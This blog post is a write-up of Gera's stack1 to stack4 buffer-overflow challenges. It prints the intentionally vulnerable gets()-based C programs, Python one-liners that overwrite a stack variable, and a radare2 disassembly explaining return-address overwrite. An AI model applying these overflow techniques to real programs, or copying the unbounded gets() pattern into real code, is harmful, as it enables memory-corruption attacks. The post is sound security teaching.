---
layout: post
category: Computer Stuff
tags: [hacking, ctf, spoiler, writeup, crackme]
---

## Introduction
In this post we will take a look at some of Gera's Insecure programming
challenges. These are a popular set of computer security challenges
flying around the web. We will look at the challenges called stack1.c
up to stack5.c
We compile everything with `gcc -m32 stackn.c -o stackn.o`, where n
is from 1 to 4. This says to gcc that we want a 32-bit binary.

## Stack1.c
{% highlight C %}
/* stack1-stdin.c                               *
 * specially crafted to feed your brain by gera */

#include <stdio.h>

int main() {
	int cookie;
	char buf[80];

	printf("buf: %08x cookie: %08x\n", &buf, &cookie);
	gets(buf);

	if (cookie == 0x41424344)
		printf("you win!\n");
}
{% endhighlight %}
As we can see the program allocates an integer and an array buf of 80
bytes on the stack and copies stdin into buf. That is already
everything. If we get the integer to change to 0x41424344 then we win.
0x41424344 converted to ASCII is ABCD, by the way.
We know that the stack grows in direction of the small addresses, so
the memory layout is likely as follows:

```
low addresses
--
buf[0]
--
...
--
buf[79]
--
4 Byte cookie
--
high addresses
```
That is we need to insert 80 bytes of junk and then "DCBA" (because of
endianness) to overwrite the cookie.

```
$ python -c 'print("A"*80+"DCBA")' | ./stack1.o
buf: ffe7697c cookie: ffe769cc
you win!
```

## Stack2.c
{% highlight C %}
/* stack2-stdin.c                               *
 * specially crafted to feed your brain by gera */

#include <stdio.h>

int main() {
	int cookie;
	char buf[80];

	printf("buf: %08x cookie: %08x\n", &buf, &cookie);
	gets(buf);

	if (cookie == 0x01020305)
  		printf("you win!\n");
}
{% endhighlight %}
This is basically the same, but this time we need to write 0x01020305
over the cookie.

```
$ python -c 'print("A"*80+"\x05\x03\x02\x01")' | stack2.o 
buf: ffbb34ec cookie: ffbb353c
you win!
```
## Stack3.c
{% highlight C %}
/* stack3-stdin.c                               *
 * specially crafted to feed your brain by gera */

#include <stdio.h>

int main() {
	int cookie;
	char buf[80];

	printf("buf: %08x cookie: %08x\n", &buf, &cookie);
	gets(buf);

	if (cookie == 0x01020005)
  		printf("you win!\n");
}
{% endhighlight %}
Again the same? Yes. But this time, the interesting thing is that we
have a 0x00. Normally this is the Null-terminator. Strings in C end
with 0x00 because this is the only way the computer can see that he
has encountered the end of the string and can stop reading.
Interestingly 'gets' does not care.

```
$ python -c 'print("A"*80+"\x05\x00\x02\x01")' | stack3.o 
buf: ffd5998c cookie: ffd599dc
you win!
```
## Stack4.c
{% highlight C %}
/* stack4-stdin.c                               *
 * specially crafted to feed your brain by gera */

#include <stdio.h>

int main() {
	int cookie;
	char buf[80];

	printf("buf: %08x cookie: %08x\n", &buf, &cookie);
	gets(buf);

	if (cookie == 0x000d0a00)
		printf("you win!\n");
}
{% endhighlight %}
Ah, the same stuff again. Piece of cake.

```
$ python -c 'print("A"*80+"\x00\x0a\x0d\x00")' | stack4.o 
buf: ff8efd3c cookie: ff8efd8c
```
Whoa, what happened? We are doomed.

Okay, according to the man-page gets reads until a newline or EOF is
encountered. Unfortunately the combination \x0a\x0d when ASCII-encoded
is a newline. We need to think of something else.
First let us recompile the binary with `gcc -g -fno-stack-protector -m32
stack4.c -o stack4.o`. The -g enables debug symbols to ease our lives,
-fno-stack-protector disables stack canaries, which are a security
mechanism. This also eases what we intend to do.
Let us take a look at the binary:

```
$ r2 -A stack4.o 
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
 -- R2 loves everyone, even Java coders, but less than others
 [0x08048370]> pdf @main
....
|           0x0804849b      e890feffff     call sym.imp.gets
|           0x080484a0      83c410         add esp, 0x10
|           0x080484a3      8b45f4         mov eax, dword [ebp - local_ch] ; stack4.c:13  if (cookie == 0x000d0a00) ; .//stack4.c:13
|           0x080484a6      3d000a0d00     cmp eax, 0xd0a00
|       ,=< 0x080484ab      7510           jne 0x80484bd
|       |   0x080484ad      83ec0c         sub esp, 0xc                ; stack4.c:14   printf("you win!\n"); ; .//stack4.c:14  .if (cookie == 0x000d0a00)
|       |   0x080484b0      686c850408     push str.you_win_ ; str.you_win_ ; "you win!" @ 0x804856c
|       |   0x080484b5      e886feffff     call sym.imp.puts
|       |   0x080484ba      83c410         add esp, 0x10
|       |   ; JMP XREF from 0x080484ab (sym.main)
|       `-> 0x080484bd      b800000000     mov eax, 0
|           0x080484c2      8b4dfc         mov ecx, dword [ebp - local_4h_2] ; stack4.c:15 } ; .//stack4.c:15  ..printf(\"you win!\n\");
....
```
We can see that there is a comparison (cmp) with the value of the cookie and if they are not equal, we jump over the block with the "you win"-string.
Let me explain to you something I did not mention earlier. When gets is called
in 0x0804849b, the program pushes the current location of the instruction
pointer to the stack. It needs to know where to continue execution
after the puts routine. Further it needs to know where the previous
stack frame started, so it also remembers a frame pointer which points
towards the previous stack frame.
Thus our stack layout from above actually is as follows:

```
low addresses
--
buf[0]
--
...
--
buf[79]
--
4 Byte cookie
--
frame pointer
--
return address
--
high addresses
```
If we craft a special string we can overwrite the return address.
Which return address would we like? 0x080484b0 seems like a good
choice, since then we pass over the evil jump.

Well, this is left as an easy exercise for the determined reader.
You would not learn anything more, if i give you the code.
If you get stuck, think about endianness.
